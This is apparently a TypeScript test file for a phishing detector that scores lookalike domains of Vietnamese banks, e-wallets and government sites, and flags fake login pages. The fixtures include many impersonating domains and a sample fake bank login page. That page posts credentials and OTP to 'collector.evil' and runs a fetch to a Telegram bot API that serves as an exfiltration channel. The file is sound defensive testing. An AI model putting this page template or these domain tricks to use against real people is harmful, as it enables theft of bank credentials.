import { describe, expect, it } from 'vitest';
import { combineSignals } from '../verdict/scoring';
import { BrandRegistry, detectBrandHits } from './brand-match';
import { analyzeUrlStatic } from './heuristics';
import { normalizeUrl, refang } from './normalize';
import { analyzePage, parsePage } from './page';
import { editDistance, skeleton } from './similarity';

const registry = new BrandRegistry();
const analyze = (u: string) => analyzeUrlStatic(normalizeUrl(u), registry);
const score = (u: string) => combineSignals(analyze(u).signals).score;
const brandOf = (u: string) => detectBrandHits(normalizeUrl(u), registry).map((h) => h.brand.id);

describe('URL normalization', () => {
  it('adds a scheme, lowercases, punycodes, strips credentials and fragments', () => {
    const n = normalizeUrl('VietcomBank-XacThuc.com/Login?a=1#x');
    expect(n.href).toBe('http://vietcombank-xacthuc.com/Login?a=1');
    expect(n.domain).toBe('vietcombank-xacthuc.com');
    const c = normalizeUrl('https://vietcombank.com.vn@evil.top/x');
    expect(c.host).toBe('evil.top');
    expect(c.hadCredentials).toBe('vietcombank.com.vn');
    expect(normalizeUrl('https://vietcоmbank.com').host).toBe('xn--vietcmbank-ivi.com');
  });

  it('refangs defanged indicators and rejects dangerous schemes', () => {
    expect(refang('hxxps://evil[.]top/a')).toBe('https://evil.top/a');
    expect(normalizeUrl('hxxp://vcb-digibank[.]top').href).toBe('http://vcb-digibank.top/');
    expect(() => normalizeUrl('javascript:alert(1)')).toThrow();
    expect(() => normalizeUrl('data:text/html,hi')).toThrow();
  });
});

describe('similarity helpers', () => {
  it('builds confusable skeletons', () => {
    expect(skeleton('vietcornbank')).toBe(skeleton('vietcombank'));
    expect(skeleton('vietc0mbank')).toBe(skeleton('vietcombank'));
    expect(skeleton('vietcоmbank')).toBe(skeleton('vietcombank')); // Cyrillic о
    expect(skeleton('paypa1')).toBe(skeleton('paypal'));
  });
  it('computes Damerau-Levenshtein distance', () => {
    expect(editDistance('vietcombank', 'vietcombnak')).toBe(1);
    expect(editDistance('agribank', 'agribnk')).toBe(1);
    expect(editDistance('techcombank', 'vietcombank')).toBe(4);
  });
});

describe('brand impersonation', () => {
  it.each([
    ['https://vietcombank-xacthuc.com/login', 'vietcombank'],
    ['http://vcb-digibank.top', 'vietcombank'],
    ['https://vietcornbank.com.vn', 'vietcombank'],
    ['https://vietc0mbank-online.net', 'vietcombank'],
    ['https://xn--vietcmbank-ivi.com', 'vietcombank'],
    ['https://vletcombank.vn', 'vietcombank'],
    ['https://vietcombank.com.vn.secure-login.xyz/', 'vietcombank'],
    ['https://techcombank-hotro.com', 'techcombank'],
    ['https://mbbank-khuyenmai.top', 'mbbank'],
    ['https://agribank-ebanking.cc', 'agribank'],
    ['https://momo-nhanqua.com', 'momo'],
    ['https://zalopay-uudai.site', 'zalopay'],
    ['https://vneid-capnhat.com', 'vneid'],
    ['https://dichvucong-gov.vn.com', 'dichvucong'],
    ['https://evn-thanhtoan.top/pay', 'evn'],
    ['https://ghn-giaohang.top', 'ghn'],
    ['https://viettelpost-giaohang.top', 'viettelpost'],
    ['https://shopee-tri-an.com', 'shopee'],
    ['https://lazada-nhanthuong.shop', 'lazada'],
    ['https://facebook-security-check.com', 'facebook'],
    ['https://paypal-secure-login.xyz', 'paypal'],
    ['https://binance-airdrop.live', 'binance'],
    ['https://vcb-login.web.app', 'vietcombank'],
    ['https://sites.google.com/view/vietcombank-xacthuc', 'vietcombank'],
  ])('%s → %s', (url, brand) => {
    expect(brandOf(url)).toContain(brand);
    expect(score(url)).toBeGreaterThanOrEqual(25);
  });

  it.each([
    ['https://vietcombank-xacthuc.com', ['vietcombank']],
    ['https://techcombank-hotro.com', ['techcombank']],
    ['https://sacombank-online.com', ['sacombank']],
    ['https://viettelpost-giaohang.top', ['viettelpost']],
    ['https://agribnk-login.com', ['agribank']],
  ])('attributes %s to exactly one brand', (url, brands) => {
    expect(brandOf(url)).toEqual(brands);
  });

  it('scores obvious bank phishing domains high', () => {
    expect(score('https://vietcombank-xacthuc.com/login')).toBeGreaterThanOrEqual(70);
    expect(score('http://vcb-digibank.top')).toBeGreaterThanOrEqual(60);
    expect(score('https://xn--vietcmbank-ivi.com')).toBeGreaterThanOrEqual(70);
    expect(analyze('https://xn--vietcmbank-ivi.com').signals.map((s) => s.id)).toContain('url.mixed_script');
  });

  it.each([
    'https://vietcombank.com.vn',
    'https://vcbdigibank.vietcombank.com.vn/',
    'https://www.bidv.com.vn/vn/ca-nhan',
    'https://ebank.tpb.vn',
    'https://www.techcombank.com/khach-hang-ca-nhan',
    'https://momo.vn',
    'https://zalopay.vn',
    'https://shopeepay.vn',
    'https://shopee.vn/product/123',
    'https://dichvucong.gov.vn/p/home/dvc-trang-chu.html',
    'https://vneid.gov.vn',
    'https://thuedientu.gdt.gov.vn',
    'https://www.evnhcmc.vn',
    'https://viettelpost.vn',
    'https://accounts.google.com/signin',
    'https://www.paypal.com/vn/signin',
    'https://www.binance.com/en',
    'https://chinhphu.vn',
    'https://shopeefood.vn',
    'https://viettelstore.vn',
    'https://www.evnnpt.vn',
    'https://bidvmetlife.com.vn',
    'https://congan.com.vn',
    'https://googleblog.com',
  ])('no false positive on official domain %s', (url) => {
    const a = analyze(url);
    expect(a.official ?? a.governmentDomain).toBeTruthy();
    expect(a.brandHits).toHaveLength(0);
    expect(combineSignals(a.signals).score).toBeLessThan(10);
  });

  it.each([
    'https://vnexpress.net/kinh-doanh',
    'https://tuoitre.vn',
    'https://finance.yahoo.com/quote/AAPL',
    'https://apply.example.org/jobs',
    'https://github.com/org/repo',
  ])('no brand hit on unrelated site %s', (url) => {
    expect(brandOf(url)).toHaveLength(0);
    expect(score(url)).toBeLessThan(25);
  });

  it('user-content platforms are not trusted even on big-brand domains', () => {
    const a = analyze('https://sites.google.com/view/vietcombank-xacthuc');
    expect(a.official).toBeNull();
    expect(a.signals.some((s) => s.weight < 0)).toBe(false);
    const fb = analyze('https://www.facebook.com/some.page');
    expect(fb.official?.id).toBe('facebook');
    expect(fb.signals.find((s) => s.id === 'url.official_domain')!.weight).toBe(-35);
  });

  it('flags structural red flags: raw IP, @ trick, apk downloads, shorteners', () => {
    expect(analyze('http://45.76.1.2/vcb').signals.map((s) => s.id)).toContain('url.ip_host');
    expect(analyze('https://vietcombank.com.vn@evil.top/').signals.map((s) => s.id)).toContain(
      'url.userinfo',
    );
    expect(analyze('https://evil.top/VNeID.apk').signals.map((s) => s.id)).toContain('url.apk_download');
    expect(analyze('https://bit.ly/3abcde').signals.map((s) => s.id)).toContain('url.shortener');
  });

  it('applies admin overrides (new official domain, disabled brand)', () => {
    const r = new BrandRegistry();
    r.applyOverrides([
      { brandId: 'vietcombank', officialDomains: ['vcb-new-official.vn'] },
      { brandId: 'binance', disabled: true },
    ]);
    expect(r.officialFor('www.vcb-new-official.vn')?.id).toBe('vietcombank');
    expect(detectBrandHits(normalizeUrl('https://binance-airdrop.live'), r)).toHaveLength(0);
  });
});

describe('landing page analysis', () => {
  const html = `<!doctype html><html><head><title>Vietcombank - Đăng nhập VCB Digibank</title></head>
    <body><form action="https://collector.evil/api" method="post">
      <input name="username" placeholder="Tên đăng nhập"><input type="password" name="pass"><input name="otp" placeholder="Mã OTP">
    </form><script>fetch("https://api.telegram.org/bot123:abc/sendMessage?chat_id=1")</script>
    <a href="/files/VCB.apk">Tải ứng dụng</a></body></html>`;

  it('parses forms, sensitive fields, exfiltration and apk links', () => {
    const p = parsePage(html);
    expect(p.title).toContain('Vietcombank');
    expect(p.hasPassword).toBe(true);
    expect(p.sensitiveFields).toEqual(expect.arrayContaining(['password', 'otp']));
    expect(p.telegramExfil).toBe(true);
    expect(p.apkLinks).toHaveLength(1);
  });

  it('turns a fake bank login page into strong signals, but not on the official domain', () => {
    const p = parsePage(html);
    const fake = analyzePage(p, normalizeUrl('https://vcb-secure.top/'), registry, null);
    expect(fake.map((s) => s.id)).toEqual(
      expect.arrayContaining([
        'page.brand_claim',
        'page.credential_form',
        'page.form_offsite',
        'page.telegram_exfil',
        'page.apk_link',
      ]),
    );
    const official = registry.officialFor('vietcombank.com.vn');
    expect(analyzePage(p, normalizeUrl('https://vietcombank.com.vn/'), registry, official)).toHaveLength(0);
  });
});
